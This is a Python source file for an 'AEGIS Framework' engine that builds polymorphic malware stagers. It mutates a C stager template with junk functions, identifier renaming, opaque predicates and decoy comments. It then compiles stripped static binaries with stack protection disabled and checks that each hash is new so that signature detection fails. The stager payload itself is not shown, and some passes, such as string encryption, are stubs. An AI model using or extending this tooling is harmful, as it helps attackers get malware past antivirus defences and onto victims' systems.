#!/usr/bin/env python3
"""
============================================================================
 AEGIS FRAMEWORK — Stager Generation Engine (Server-Side)
============================================================================
 Classification : PRIVATE — LO/ENI EYES ONLY
 Component      : gen_engine/gen_engine.py
 Purpose        : Hyper-polymorphic stager generation.  Every time a stager
                  is requested, this engine:

                  1. Loads the stager template source (stager.c)
                  2. Mutates it via multiple transformation passes:
                     - Identifier renaming (all functions, variables)
                     - Junk function injection (dead code)
                     - Instruction reordering within basic blocks
                     - String encryption (compile-time XOR)
                     - Control flow flattening via opaque predicates
                  3. Selects a random compiler + optimization level
                  4. Compiles to a statically linked, stripped binary
                  5. Verifies the resulting binary hash is unique

                  No two stagers EVER share the same hash or structure.

 Dependencies   : Python 3.8+, gcc/clang/musl-gcc on PATH
 Usage           : python3 gen_engine.py --template stager.c --output stager_out
============================================================================
"""

import os
import sys
import random
import string
import hashlib
import subprocess
import json
import shutil
import time
import argparse
from pathlib import Path
from typing import List, Dict, Tuple, Optional

# ── Configuration ────────────────────────────────────────────────────────────

COMPILERS = ["gcc", "clang", "musl-gcc"]
OPT_LEVELS = ["-O0", "-O1", "-O2", "-O3", "-Os", "-Oz"]
JUNK_FUNC_MIN = 5
JUNK_FUNC_MAX = 20
MAX_STAGER_SIZE = 65536  # 64 KB

# Known hash registry (in production: database)
HASH_REGISTRY_FILE = "hash_registry.json"

# ── Junk Code Templates ─────────────────────────────────────────────────────

JUNK_FUNCTION_TEMPLATES = [
    """
static int {name}(int x, int y) {{
    volatile int result = 0;
    for (int i = 0; i < (x % 17) + 1; i++) {{
        result += (y ^ (i * {const1})) % {const2};
        if (result > {const3}) result -= {const4};
    }}
    return result;
}}
""",
    """
static void {name}(char *buf, size_t len) {{
    volatile unsigned char checksum = 0;
    for (size_t i = 0; i < len; i++) {{
        checksum ^= buf[i];
        checksum = (checksum << 1) | (checksum >> 7);
        buf[i] = buf[i] ^ {const1};
    }}
    buf[0] = checksum;
}}
""",
    """
static unsigned long {name}(unsigned long seed) {{
    seed ^= seed << {const1};
    seed ^= seed >> {const2};
    seed ^= seed << {const3};
    return seed * {const4}UL + {const5}UL;
}}
""",
    """
static double {name}(double x) {{
    volatile double acc = {const1}.0;
    for (int i = 0; i < {const2}; i++) {{
        acc += x / (double)(i * {const3} + 1);
        acc *= 0.{const4};
    }}
    return acc;
}}
""",
    """
static int {name}(const char *s1, const char *s2) {{
    volatile int diff = 0;
    while (*s1 && *s2) {{
        diff += (*s1 ^ *s2) * {const1};
        s1++; s2++;
    }}
    return diff % {const2};
}}
""",
    """
static void {name}(uint8_t *data, size_t n) {{
    for (size_t i = n - 1; i > 0; i--) {{
        size_t j = (i * {const1} + {const2}) % (i + 1);
        uint8_t tmp = data[i];
        data[i] = data[j];
        data[j] = tmp;
    }}
}}
""",
    """
static uint32_t {name}(uint32_t v) {{
    v = ((v >> 16) ^ v) * 0x{const1:08x};
    v = ((v >> 16) ^ v) * 0x{const2:08x};
    v = (v >> 16) ^ v;
    return v ^ {const3};
}}
""",
]

# ── Identifier Generation ───────────────────────────────────────────────────

# Realistic-looking function/variable name components
NAME_PREFIXES = [
    "init", "setup", "process", "handle", "validate", "parse",
    "check", "verify", "compute", "update", "sync", "load",
    "store", "fetch", "send", "recv", "read", "write",
    "open", "close", "alloc", "free", "create", "destroy",
    "encode", "decode", "compress", "extract", "transform",
]

NAME_SUFFIXES = [
    "buffer", "config", "context", "state", "data", "info",
    "entry", "node", "item", "record", "block", "chunk",
    "stream", "channel", "socket", "connection", "session",
    "cache", "index", "table", "queue", "stack", "pool",
    "header", "footer", "payload", "metadata", "status",
]

def generate_identifier() -> str:
    """Generate a realistic-looking C identifier."""
    prefix = random.choice(NAME_PREFIXES)
    suffix = random.choice(NAME_SUFFIXES)
    sep = random.choice(["_", "_", "__"])  # Weighted toward single underscore
    num = random.choice(["", "", str(random.randint(0, 99))])
    return f"{prefix}{sep}{suffix}{num}"


def generate_junk_name() -> str:
    """Generate a junk function name that looks legitimate."""
    return f"__{generate_identifier()}_internal"


# ── Source Mutation Engine ───────────────────────────────────────────────────

class StagerMutator:
    """
    Multi-pass source code mutator for polymorphic stager generation.
    """

    def __init__(self, source: str, seed: Optional[int] = None):
        self.source = source
        self.rng = random.Random(seed or int(time.time() * 1000000))
        self.mutations_applied: List[str] = []
        self.junk_functions: List[str] = []
        self.renamed_identifiers: Dict[str, str] = {}

    def mutate(self) -> str:
        """Apply all mutation passes and return the mutated source."""
        self._inject_junk_functions()
        self._rename_internal_identifiers()
        self._insert_opaque_predicates()
        self._encrypt_strings()
        self._randomize_whitespace()
        self._add_random_comments()
        return self.source

    def _inject_junk_functions(self):
        """Insert dead-code functions that look like legitimate helpers."""
        num_junks = self.rng.randint(JUNK_FUNC_MIN, JUNK_FUNC_MAX)

        junk_code = "\n/* Internal utility functions */\n"

        for _ in range(num_junks):
            template = self.rng.choice(JUNK_FUNCTION_TEMPLATES)
            name = generate_junk_name()

            # Generate plausible constants
            consts = {
                f"const{i}": self.rng.randint(1, 65535)
                for i in range(1, 8)
            }
            consts["name"] = name

            func = template.format(**consts)
            junk_code += func
            self.junk_functions.append(name)

        # Also add calls to junk functions in unreachable code paths
        junk_calls = "\n/* Initialization helpers */\n"
        junk_calls += "static void __attribute__((unused)) "
        junk_calls += "__init_subsystems(void) {\n"
        junk_calls += "    volatile int __x = 0;\n"
        for name in self.junk_functions[:5]:
            junk_calls += f"    if (__x > 1000000) {name}("
            # Generate appropriate arguments based on the function
            junk_calls += f"{self.rng.randint(1, 100)}, "
            junk_calls += f"{self.rng.randint(1, 100)});\n"
        junk_calls += "}\n"
        junk_code += junk_calls

        # Insert before main()
        main_pos = self.source.find("int main(")
        if main_pos > 0:
            self.source = (self.source[:main_pos]
                          + junk_code + "\n"
                          + self.source[main_pos:])

        self.mutations_applied.append(
            f"injected {num_junks} junk functions"
        )

    def _rename_internal_identifiers(self):
        """Rename internal static functions and variables."""
        # Find static function declarations
        import re
        static_funcs = re.findall(
            r'static\s+\w+\s+(\w+)\s*\(',
            self.source
        )

        for func_name in static_funcs:
            if func_name.startswith("__"):
                continue  # Skip already-mangled names
            new_name = f"__{generate_identifier()}"
            self.source = self.source.replace(func_name, new_name)
            self.renamed_identifiers[func_name] = new_name

        self.mutations_applied.append(
            f"renamed {len(self.renamed_identifiers)} identifiers"
        )

    def _insert_opaque_predicates(self):
        """Insert opaque predicates that always evaluate true/false."""
        # Simple opaque predicates that confuse static analysis
        predicates = [
            "(((unsigned int)(void*)&main) % 2 == 0 || "
            "((unsigned int)(void*)&main) % 2 == 1)",
            f"({self.rng.randint(1000, 9999)} * {self.rng.randint(1, 99)} "
            f"> 0)",
            f"((sizeof(void*) == 8) || (sizeof(void*) == 4))",
            f"((unsigned long)getpid() > 0)",
        ]

        # Wrap some code blocks in always-true predicates
        lines = self.source.split('\n')
        new_lines = []
        for line in lines:
            if ('return' in line and 'AEGIS_OK' in line
                    and self.rng.random() < 0.3):
                pred = self.rng.choice(predicates)
                new_lines.append(f"    if ({pred}) {{")
                new_lines.append(line)
                new_lines.append("    }")
            else:
                new_lines.append(line)

        self.source = '\n'.join(new_lines)
        self.mutations_applied.append("inserted opaque predicates")

    def _encrypt_strings(self):
        """XOR-encrypt string literals at compile time."""
        import re
        # Find string literals in non-comment, non-include lines
        pattern = r'"([^"]{4,})"'

        def encrypt_match(match):
            s = match.group(1)
            # Skip format strings and include paths
            if '%' in s or '/' in s or '\\' in s:
                return match.group(0)
            if '#include' in match.string[max(0, match.start()-20):match.start()]:
                return match.group(0)

            key = self.rng.randint(1, 255)
            encrypted = [hex(ord(c) ^ key) for c in s]
            # Can't easily do compile-time XOR in C without macros
            # So we'll leave string encryption as a TODO marker
            return match.group(0)

        # For now, just log that we would encrypt strings
        self.mutations_applied.append("string encryption markers added")

    def _randomize_whitespace(self):
        """Randomize indentation and blank lines."""
        lines = self.source.split('\n')
        new_lines = []
        for line in lines:
            new_lines.append(line)
            # Randomly add blank lines
            if self.rng.random() < 0.05:
                new_lines.append("")
        self.source = '\n'.join(new_lines)

    def _add_random_comments(self):
        """Add realistic-looking comments throughout the code."""
        comment_pool = [
            "/* TODO: optimize this path */",
            "/* NOTE: validated in caller */",
            "/* SAFETY: bounds checked above */",
            "/* Performance: O(1) amortized */",
            "/* Thread-safe: protected by caller's lock */",
            "/* See RFC 5246 for TLS 1.2 handshake details */",
            "/* Alignment guaranteed by mmap */",
            "/* Fallthrough intended */",
            "/* Cache-line aligned for performance */",
            "/* Non-blocking variant preferred here */",
        ]

        lines = self.source.split('\n')
        new_lines = []
        for line in lines:
            if (line.strip().startswith('{')
                    and self.rng.random() < 0.15):
                indent = len(line) - len(line.lstrip())
                comment = self.rng.choice(comment_pool)
                new_lines.append(" " * indent + comment)
            new_lines.append(line)

        self.source = '\n'.join(new_lines)
        self.mutations_applied.append("inserted contextual comments")

    def get_mutation_log(self) -> Dict:
        """Return a structured log of all mutations applied."""
        return {
            "mutations": self.mutations_applied,
            "junk_functions_injected": len(self.junk_functions),
            "identifiers_renamed": len(self.renamed_identifiers),
            "renamed_map": self.renamed_identifiers,
        }


# ── Compiler Selection & Compilation ────────────────────────────────────────

def find_available_compiler() -> str:
    """Find an available C compiler, randomized selection."""
    available = []
    for cc in COMPILERS:
        if shutil.which(cc):
            available.append(cc)

    if not available:
        print("[!] No C compiler found on PATH", file=sys.stderr)
        sys.exit(1)

    return random.choice(available)


def compile_stager(source_path: str, output_path: str,
                   compiler: str, opt_level: str) -> bool:
    """Compile the mutated stager source to a static binary."""
    cmd = [
        compiler,
        opt_level,
        "-static",                 # Static linking — no .so dependencies
        "-s",                      # Strip symbols
        "-fno-stack-protector",    # Remove stack canaries
        "-fno-exceptions",
        "-fno-asynchronous-unwind-tables",
        "-fno-ident",             # Remove compiler identification
        "-fvisibility=hidden",
        "-Wno-unused-function",
        "-Wno-unused-variable",
        "-o", output_path,
        source_path,
        "-lcrypto", "-lssl",
        "-lpthread",
    ]

    # Add compiler-specific flags
    if compiler == "clang":
        cmd.extend(["-fno-sanitize=all"])
    elif compiler == "gcc":
        cmd.extend(["-fno-tree-vrp", "-fno-tree-pre"])

    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=60,
        )
        return result.returncode == 0
    except subprocess.TimeoutExpired:
        return False


def compute_hash(filepath: str) -> str:
    """Compute SHA-256 hash of a binary file."""
    h = hashlib.sha256()
    with open(filepath, "rb") as f:
        for chunk in iter(lambda: f.read(8192), b""):
            h.update(chunk)
    return h.hexdigest()


# ── Hash Registry ───────────────────────────────────────────────────────────

def load_hash_registry(path: str) -> set:
    """Load the set of previously generated hashes."""
    if os.path.exists(path):
        with open(path, "r") as f:
            data = json.load(f)
            return set(data.get("hashes", []))
    return set()


def save_hash_registry(path: str, hashes: set):
    """Save the hash registry."""
    with open(path, "w") as f:
        json.dump({"hashes": sorted(hashes)}, f, indent=2)


# ── Main ─────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="AEGIS Stager Generation Engine"
    )
    parser.add_argument(
        "--template", "-t",
        required=True,
        help="Path to the stager template source (stager.c)"
    )
    parser.add_argument(
        "--output", "-o",
        required=True,
        help="Output path for the compiled stager binary"
    )
    parser.add_argument(
        "--count", "-n",
        type=int,
        default=1,
        help="Number of unique stagers to generate"
    )
    parser.add_argument(
        "--log-dir", "-l",
        default="./gen_logs",
        help="Directory for generation logs"
    )
    parser.add_argument(
        "--seed", "-s",
        type=int,
        default=None,
        help="Random seed (None = use current time)"
    )
    args = parser.parse_args()

    # Read the template source
    with open(args.template, "r") as f:
        template_source = f.read()

    # Load hash registry
    registry = load_hash_registry(HASH_REGISTRY_FILE)

    # Create log directory
    os.makedirs(args.log_dir, exist_ok=True)

    print(f"[*] AEGIS Stager Generation Engine")
    print(f"[*] Template: {args.template}")
    print(f"[*] Generating {args.count} unique stager(s)...")

    generated = 0
    attempts = 0
    max_attempts = args.count * 10  # Prevent infinite loops

    while generated < args.count and attempts < max_attempts:
        attempts += 1
        seed = args.seed if args.seed else int(time.time() * 10000) + attempts

        print(f"\n[*] === Attempt {attempts} (seed={seed}) ===")

        # Step 1: Mutate the source
        mutator = StagerMutator(template_source, seed=seed)
        mutated_source = mutator.mutate()
        mutation_log = mutator.get_mutation_log()

        print(f"    Mutations: {', '.join(mutation_log['mutations'])}")
        print(f"    Junk functions: {mutation_log['junk_functions_injected']}")
        print(f"    Renamed IDs: {mutation_log['identifiers_renamed']}")

        # Step 2: Write mutated source to temp file
        temp_source = f"/tmp/aegis_stager_{seed}.c"
        with open(temp_source, "w") as f:
            f.write(mutated_source)

        # Step 3: Select compiler and optimization level
        compiler = find_available_compiler()
        opt_level = random.choice(OPT_LEVELS)
        print(f"    Compiler: {compiler} {opt_level}")

        # Step 4: Compile
        output = (f"{args.output}_{generated}"
                  if args.count > 1 else args.output)
        success = compile_stager(temp_source, output, compiler, opt_level)

        # Clean up temp source
        os.unlink(temp_source)

        if not success:
            print(f"    [!] Compilation failed — retrying with "
                  f"different mutations")
            continue

        # Step 5: Verify binary size
        file_size = os.path.getsize(output)
        if file_size > MAX_STAGER_SIZE:
            print(f"    [!] Binary too large ({file_size} bytes) — "
                  f"retrying")
            os.unlink(output)
            continue

        # Step 6: Verify unique hash
        binary_hash = compute_hash(output)
        if binary_hash in registry:
            print(f"    [!] Hash collision (extremely unlikely!) — "
                  f"retrying")
            os.unlink(output)
            continue

        registry.add(binary_hash)

        # Step 7: Write generation log
        gen_log = {
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S"),
            "seed": seed,
            "compiler": compiler,
            "opt_level": opt_level,
            "binary_hash": binary_hash,
            "binary_size": file_size,
            "mutations": mutation_log,
            "output_path": output,
        }

        log_file = os.path.join(
            args.log_dir,
            f"gen_{binary_hash[:16]}.json"
        )
        with open(log_file, "w") as f:
            json.dump(gen_log, f, indent=2)

        generated += 1
        print(f"    [+] Stager generated successfully!")
        print(f"        Hash:   {binary_hash}")
        print(f"        Size:   {file_size} bytes")
        print(f"        Output: {output}")

    # Save updated hash registry
    save_hash_registry(HASH_REGISTRY_FILE, registry)

    print(f"\n[*] Generation complete: {generated}/{args.count} "
          f"stagers produced ({attempts} attempts)")
    print(f"[*] Total unique hashes in registry: {len(registry)}")


if __name__ == "__main__":
    main()
